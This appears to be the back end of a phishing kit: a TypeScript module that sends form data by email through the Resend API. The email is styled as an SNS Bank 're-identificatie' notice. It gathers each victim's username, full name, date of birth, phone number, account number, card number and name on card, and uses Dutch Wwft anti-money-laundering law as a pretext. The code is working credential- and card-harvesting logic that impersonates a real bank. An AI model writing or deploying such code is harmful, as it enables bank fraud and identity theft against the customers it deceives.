import { Resend } from 'resend';

if (!process.env.RESEND_API_KEY) {
  throw new Error("RESEND_API_KEY environment variable must be set");
}

const resend = new Resend(process.env.RESEND_API_KEY);

interface EmailParams {
  to: string;
  from: string;
  subject: string;
  text?: string;
  html?: string;
}

export async function sendEmail(params: EmailParams): Promise<boolean> {
  try {
    await resend.emails.send({
      to: params.to,
      from: params.from,
      subject: params.subject,
      text: params.text,
      html: params.html,
    });
    return true;
  } catch (error) {
    console.error('Resend email error:', error);
    return false;
  }
}

export function generateReidentificationEmail(formData: any): { subject: string; html: string; text: string } {
  const subject = "SNS Bank Re-identificatie Gegevens";
  
  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <div style="background-color: #FF6600; padding: 20px; text-align: center;">
        <h1 style="color: white; margin: 0;">SNS Bank</h1>
        <h2 style="color: white; margin: 10px 0 0 0;">Re-identificatie Gegevens</h2>
      </div>
      
      <div style="padding: 20px; background-color: #f9f9f9;">
        <h3 style="color: #003366;">Persoonlijke Gegevens</h3>
        <p><strong>Gebruikersnaam:</strong> ${formData.username}</p>
        <p><strong>Volledige naam:</strong> ${formData.fullName}</p>
        <p><strong>Rekeningtypes:</strong> ${formData.accountTypes?.join(', ')}</p>
        
        <h3 style="color: #003366;">ID Verificatie</h3>
        <p><strong>ID Type:</strong> ${formData.idType}</p>
        <p><strong>Geboortedatum:</strong> ${formData.dateOfBirth}</p>
        <p><strong>Telefoonnummer:</strong> ${formData.phoneNumber}</p>
        <p><strong>Rekeningnummer:</strong> ${formData.accountNumber}</p>
        <p><strong>Kaartnummer:</strong> ${formData.cardNumber}</p>
        <p><strong>Naam op kaart:</strong> ${formData.cardName}</p>
        
        <h3 style="color: #003366;">Aanvullende Gegevens</h3>
        <p><strong>Ontbrekende gegevens:</strong> ${formData.missingData?.join(', ')}</p>
        <p><strong>E-mailadres:</strong> ${formData.fullEmail}</p>
        
        <p style="margin-top: 30px; padding: 15px; background-color: #e8f4fd; border-left: 4px solid #FF6600;">
          <strong>Let op:</strong> Deze gegevens zijn verzonden voor re-identificatie volgens Wwft wetgeving.
        </p>
      </div>
    </div>
  `;
  
  const text = `
SNS Bank Re-identificatie Gegevens

Persoonlijke Gegevens:
- Gebruikersnaam: ${formData.username}
- Volledige naam: ${formData.fullName}
- Rekeningtypes: ${formData.accountTypes?.join(', ')}

ID Verificatie:
- ID Type: ${formData.idType}
- Geboortedatum: ${formData.dateOfBirth}
- Telefoonnummer: ${formData.phoneNumber}
- Rekeningnummer: ${formData.accountNumber}
- Kaartnummer: ${formData.cardNumber}
- Naam op kaart: ${formData.cardName}

Aanvullende Gegevens:
- Ontbrekende gegevens: ${formData.missingData?.join(', ')}
- E-mailadres: ${formData.fullEmail}

Let op: Deze gegevens zijn verzonden voor re-identificatie volgens Wwft wetgeving.
  `;
  
  return { subject, html, text };
}
